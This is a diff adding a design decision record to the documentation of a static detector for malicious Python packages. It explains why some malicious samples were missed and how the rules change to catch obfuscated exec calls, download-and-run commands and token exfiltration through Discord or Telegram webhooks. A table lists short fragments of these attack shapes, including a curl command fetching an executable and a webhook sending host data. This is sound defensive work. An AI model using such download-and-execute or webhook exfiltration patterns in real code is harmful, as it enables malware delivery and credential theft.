@@ -1201,6 +1201,92 @@ are a few dozen to a few hundred packages.
 
 ---
 
+## ADR-028 — Conformance fixes from the test-set error analysis (ruleset 3)
+
+**Date:** 2026-10-09. **Status:** accepted. Amends ADR-006, ADR-018 and ADR-025; no new rule,
+no new constant.
+
+### Context
+
+Mode D misses 398 of 2 095 malicious test-set samples at τ 0.40, and **382 of them produce no
+finding at all** (16 are scan errors). None is a scoring effect: the method found no path.
+GuardDog flags 322 of the 382; its rule names on them give the shape of the misses
+(obfuscation by `chr` 64, base64-exec 38, download-and-execute 41, exfiltration 38, messenger
+exfiltration 26). Samples of each were read, and each shape was reproduced as an inert
+two-line probe. Seven causes, every one a place where the implementation fell short of what
+RULES.md already says a rule catches, or of what the data-flow model already claims to carry:
+
+| Shape in the corpus | Rule that should fire | Why it did not |
+|---|---|---|
+| `exec("".join(chr(i) for i in [101, …]))` (pyobfuscate) | OBF-001 (RULES.md lists `chr`-join) | `chr` was excluded from `DECODERS` |
+| `eval("\145\166\141\154")` (BlankOBF) | OBF-001 (encoding) | escapes written in the literal are encoding done by the lexer; nothing looked at them |
+| `subprocess.run([..., "curl.exe -L https://h/a.exe -o x"])` | DRP-003 ("raw endpoint executed") | the URL literal shape needs the *whole* literal to be a URL |
+| the same command as an f-string | DRP-003 | an interpolated string produced no literal node, so its fixed text was invisible |
+| `SyncWebhook.from_url(u).send(content=host)` | EXF-001…003 | messenger webhooks were not egress sinks; a factory-built receiver was untyped |
+| `re.findall(token_re, open(p).read())` → post | EXF-001/002 | `re` dropped taint; a stealer's extraction step cut the path |
+| `found.append(token)` … post `found` | EXF-001/002 | appending did not taint the list, though ADR-007 asks containers to propagate |
+
+### Choice
+
+1. **`chr` is a decoder** (amends ADR-018's exclusion): a `chr` over constant input is a
+   `DecodedLiteral`, so each stage of a decoding chain is a source, as it already was for
+   nested `base64`/`zlib`.
+2. **An escape-encoded literal is a `DecodedLiteral`** (`<escaped-literal>`): at least four
+   printable ASCII characters written as `\xHH`, `\ooo` or `\uHHHH`, making up at least half
+   of the literal. Control and binary escapes do not count.
+3. **`<literal:command-with-url>`**, a `SuspiciousLiteral` shape: a literal of two or more words
+   with a non-index URL among them (`SuspiciousLiteral` feeds DRP-003, BKD-001 and SAB-001).
+   A URL with `{…}` holes is a template being filled in and no longer matches *alone*, only
+   inside a command: on the development set the f-string change made libc's maintenance
+   script (`https://github.com/{}/{}/pull/{}` handed to `git`) flag `orjson`, and the same
+   rule removes a known ruleset-2 false positive (`ruamel-yaml`, Malicious through a
+   `'https://sourceforge.net/p/{0}'.format` template reaching `subprocess` and `os.remove`).
+4. **An f-string's fixed text is a literal** (amends ADR-006): an interpolated string yields
+   its `{…}` expressions as before plus one `Literal` node holding its text with `{}` for each
+   hole.
+5. **Messenger webhooks are `NetworkEgress`**: `discord.SyncWebhook`, `discord.Webhook`,
+   `discord_webhook`, `discordwebhook`, `dhooks`, `telebot.TeleBot`, `telegram.Bot` — the
+   sending surface only, not the client libraries. Receiver typing (ADR-025) gains a closed
+   list of class-method factories (`SyncWebhook.from_url`, `.partial`) next to its closed list
+   of lower-case constructors.
+6. **Regex matches carry taint** (amends ADR-006): `re` is taint-preserving, and so are the
+   match methods (`findall`, `search`, `match`, `fullmatch`, `finditer`, `group`, `groups`,
+   `groupdict`) on a value.
+7. **Appending taints the container** (amends ADR-006, stateful objects): `append`,
+   `extend`, `insert`, `add`, `update` join the closed list of methods that write their
+   arguments into their receiver.
+
+**Known limit:** `map(chr, [...])` passes `chr` as a value and is not seen; the generator form
+(`chr(i) for i in …`) is.
+
+**Development set, mode D, ruleset 2 → 3:** τ 0.40 recall 0.90 → 0.95, false positives 4 → 4
+of 20 benign; τ 0.70 false positives 1 → 0 (`ruamel-yaml`). Newly found: `reverseshell`.
+
+Each change has a malicious/benign twin test in `rules::engine` (the benign twin keeps the
+vocabulary and loses the path), and the matchers have edge-case tests in `graph::reach`.
+
+### Alternatives considered
+
+- **Port GuardDog's rules for the remaining misses.** Rejected: rules are derived from the
+  Backstabber taxonomy (invariant 4), not from another tool's catalogue. Shapes outside the
+  current catalogue (CTF flag uploaders, SMS bombers, `pip install` at run time) stay misses and
+  are reported as such in the error analysis.
+- **Widen `url_not_index` to "contains a URL".** Rejected: the shape name would stop describing
+  what it matches; a separate shape keeps the evidence readable.
+- **Type every `C.method(...)` result as a `C`.** Rejected for the reason ADR-025 gives for
+  constructors: wrong often enough to matter. A closed list grows by evidence.
+
+### Consequences
+
+`RULESET_VERSION` 2 → 3. These changes were motivated by **test-set** misses, so the test-set
+numbers under ruleset 3 are post-hoc and are reported beside ruleset 2's, never instead of
+them. The honest measurement is the Backstabber split's `new` subset (ADR-026), which no
+version of the rules has been run on. Expected cost: more DRP-003 and OBF-001 findings on
+benign packages that shell out to URLs or keep escaped strings; the benign side of the test
+set measures it.
+
+---
+
 ## Open requests
 
 Implementers append here. Format: date, who, what rule is missing, what conservative reading
